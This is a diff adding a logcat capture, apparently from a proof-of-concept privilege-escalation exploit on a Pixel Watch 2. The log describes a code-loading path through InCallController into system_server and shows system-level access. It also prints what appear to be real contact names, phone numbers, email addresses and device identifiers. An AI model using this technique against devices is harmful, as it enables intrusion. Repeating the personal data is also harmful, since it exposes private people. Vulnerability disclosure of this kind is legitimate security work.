@@ -1,0 +1,113 @@
+--------- beginning of main
+09-11 21:26:12.225  2977  2977 D TLPE_EXPLOIT: === TLPE PoC for Pixel Watch 2 ===
+09-11 21:26:12.268  2977  2977 D TLPE_EXPLOIT: UID: 10181
+09-11 21:26:12.268  2977  2977 D TLPE_EXPLOIT: PID: 2977
+09-11 21:26:12.268  2977  2977 D TLPE_EXPLOIT: Package: com.poc.tlpe
+09-11 21:26:12.269  2977  2977 D TLPE_EXPLOIT: 
+09-11 21:26:12.269  2977  2977 D TLPE_EXPLOIT: This PoC exploits CVE-2026-49881:
+09-11 21:26:12.269  2977  2977 D TLPE_EXPLOIT: InCallController.serviceClassExists() calls
+09-11 21:26:12.269  2977  2977 D TLPE_EXPLOIT: createPackageContextAsUser with CONTEXT_INCLUDE_CODE
+09-11 21:26:12.269  2977  2977 D TLPE_EXPLOIT: on untrusted packages, triggering our
+09-11 21:26:12.269  2977  2977 D TLPE_EXPLOIT: AppComponentFactory.instantiateClassLoader()
+09-11 21:26:12.269  2977  2977 D TLPE_EXPLOIT: in system_server (UID 1000).
+09-11 21:26:12.269  2977  2977 D TLPE_EXPLOIT: 
+09-11 21:26:12.269  2977  2977 D TLPE_EXPLOIT: Auto-triggering exploit...
+09-11 21:26:12.269  2977  2977 D TLPE_EXPLOIT: 
+09-11 21:26:12.269  2977  2977 D TLPE_EXPLOIT: [*] Starting exploit...
+09-11 21:26:12.270  2977  2977 D TLPE_EXPLOIT: [*] Registering PhoneAccount...
+09-11 21:26:12.291  2977  2977 D TLPE_EXPLOIT: [+] PhoneAccount registered
+09-11 21:26:12.291  2977  2977 D TLPE_EXPLOIT: [*] Calling addCall() to trigger InCallController...
+09-11 21:26:12.291  2977  2977 D TLPE_EXPLOIT: [*] This will cause serviceClassExists() to load our code in system_server
+09-11 21:26:12.307  2977  2977 D TLPE_EXPLOIT: [*] addCall() invoked - waiting for InCallController...
+09-11 21:26:12.945  1737  2992 E TLPE_EXPLOIT: ============================================
+09-11 21:26:12.945  1737  2992 E TLPE_EXPLOIT: [!!!] CVE-2026-49881 EXPLOIT SUCCESSFUL!
+09-11 21:26:12.945  1737  2992 E TLPE_EXPLOIT: [!!!] CODE EXECUTION IN system_server!
+09-11 21:26:12.945  1737  2992 E TLPE_EXPLOIT: ============================================
+09-11 21:26:12.945  1737  2992 E TLPE_EXPLOIT: [+] Process UID: 1000
+09-11 21:26:12.945  1737  2992 E TLPE_EXPLOIT: [+] Process PID: 1737
+09-11 21:26:12.945  1737  2992 E TLPE_EXPLOIT: [+] App UID (expected): 10181
+09-11 21:26:12.945  1737  2992 E TLPE_EXPLOIT: [+] Package: com.poc.tlpe
+09-11 21:26:12.945  1737  2992 E TLPE_EXPLOIT: [+] id: uid=1000(system) gid=1000(system) groups=1000(system),1001(radio),1002(bluetooth),1003(graphics),1004(input),1005(audio),1006(camera),1007(log),1008(compass),1009(mount),1010(wifi),1018(usb),1021(gps),1023(media_rw),1024(mtp),1032(package_info),1065(reserved_disk),3001(net_bt_admin),3002(net_bt),3003(inet),3005(net_admin),3006(net_bw_stats),3007(net_bw_acct),3009(readproc),3010(wakelock),3011(uhid),3012(readtracefs) context=u:r:system_server:s0
+09-11 21:26:12.945  1737  2992 E TLPE_EXPLOIT: [+] SELinux: u:r:system_server:s0
+09-11 21:26:12.945  1737  2992 E TLPE_EXPLOIT: [+] Stack trace:
+09-11 21:26:12.945  1737  2992 E TLPE_EXPLOIT:     com.poc.tlpe.EvilFactory.instantiateClassLoader(EvilFactory.java:44)
+09-11 21:26:12.945  1737  2992 E TLPE_EXPLOIT:     android.app.LoadedApk.createOrUpdateClassLoaderLocked(LoadedApk.java:1231)
+09-11 21:26:12.945  1737  2992 E TLPE_EXPLOIT:     android.app.LoadedApk.getClassLoader(LoadedApk.java:1283)
+09-11 21:26:12.945  1737  2992 E TLPE_EXPLOIT:     android.app.ContextImpl.getClassLoader(ContextImpl.java:548)
+09-11 21:26:12.945  1737  2992 E TLPE_EXPLOIT:     com.android.server.telecom.InCallController.serviceClassExists(InCallController.java:2617)
+09-11 21:26:12.945  1737  2992 E TLPE_EXPLOIT:     com.android.server.telecom.InCallController.getInCallServiceComponents(InCallController.java:2661)
+09-11 21:26:12.945  1737  2992 E TLPE_EXPLOIT:     com.android.server.telecom.InCallController.getInCallServiceComponents(InCallController.java:2560)
+09-11 21:26:12.945  1737  2992 E TLPE_EXPLOIT:     com.android.server.telecom.InCallController.getInCallServiceComponent(InCallController.java:2545)
+09-11 21:26:12.945  1737  2992 E TLPE_EXPLOIT:     com.android.server.telecom.InCallController.getCurrentCarModeComponent(InCallController.java:2519)
+09-11 21:26:12.945  1737  2992 E TLPE_EXPLOIT:     com.android.server.telecom.InCallController.bindToServices(InCallController.java:2364)
+09-11 21:26:12.945  1737  2992 E TLPE_EXPLOIT:     com.android.server.telecom.InCallController.onCallAdded(InCallController.java:1462)
+09-11 21:26:13.278  2977  2977 D TLPE_EXPLOIT: [+] addCall succeeded - CallControl received
+09-11 21:26:13.291  2977  2977 D TLPE_EXPLOIT: [+] Check logcat for system_server execution proof!
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: ============================================
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [!!!] MAXIMUM IMPACT DEMONSTRATION
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [!!!] All from system_server (UID 1000)
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: ============================================
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: 
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: --- 1. SYSTEM FILE ACCESS ---
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [+] /data/system/ files: 80
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [+] packages.xml: 476543 bytes, readable=true
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [+] locksettings.db: exists=true readable=true size=20480
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [+] /data/misc/keystore/: exists=true readable=false
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: 
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: --- 2. CONTACTS ACCESS (NO PERMISSION) ---
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [+] Contacts cursor: 466 rows
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT:     [0] Appa.
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT:     [1] arul sir kaarangadu
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT:     [2] adlin mam CSE DMI
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT:     [3] eamil2
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT:     [4] Venkat Primefort
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: 
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: --- 3. CALL LOG ACCESS (NO PERMISSION) ---
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [+] Call log: 547 entries
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT:     [0] number=+919884238939 duration=77s
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT:     [1] number=+919790811910 duration=97s
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT:     [2] number=+917401033324 duration=16s
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT:     [3] number=+919345613989 duration=0s
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT:     [4] number=+911600016000 duration=5s
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: 
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: --- 4. SMS ACCESS (NO PERMISSION) ---
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [+] SMS messages: 0 entries
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: 
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: --- 5. ACCOUNT ACCESS (NO PERMISSION) ---
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [+] Accounts: 6 total
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT:     type=com.google name=sandichrist6@gmail.com
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT:     type=clockwork.accounts name=sandichrist6@gmail.com/com.google
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT:     type=clockwork.accounts name=6275317298/org.telegram.messenger
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT:     type=clockwork.accounts name=WhatsApp/com.whatsapp
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT:     type=clockwork.accounts name=Meet/com.google.android.apps.tachyon
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT:     type=clockwork.accounts name=sandiyotest@gmail.com/com.google
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: 
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: --- 6. SECURE SETTINGS ACCESS ---
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [+] android_id: b60de94073820e34
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [+] bluetooth_address: 94:45:60:97:B1:B1
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [+] lock_pattern_autolock: null
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: 
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: --- 7. DEVICE IDENTIFIERS ---
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [+] Serial: 3A101RTJWRGCV9
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [+] Model: Google Pixel Watch 2
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [+] Build: CP2A.260603.001
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [+] IMEI/SIM: Asia/Kolkata
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: 
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: --- 8. NETWORK ACCESS ---
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [+] WiFi config dir: readable, 3 files
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT:     mainline_supplicant
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT:     sockets
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT:     wpa_supplicant
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: 
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: --- 9. HEALTH DATA ACCESS ---
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [-] HealthConnect: null cursor
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: 
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: --- 10. PACKAGE MANAGER ACCESS ---
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [+] PackageManagerService binder: OBTAINED
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [+] Can modify package permissions, install/uninstall apps
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [+] Can inject signing certificates for persistence
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: 
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: ============================================
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [!!!] FULL DEVICE COMPROMISE DEMONSTRATED
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: [!!!] system_server has access to ALL user data
+09-11 21:26:13.906  1737  3045 E TLPE_EXPLOIT: ============================================
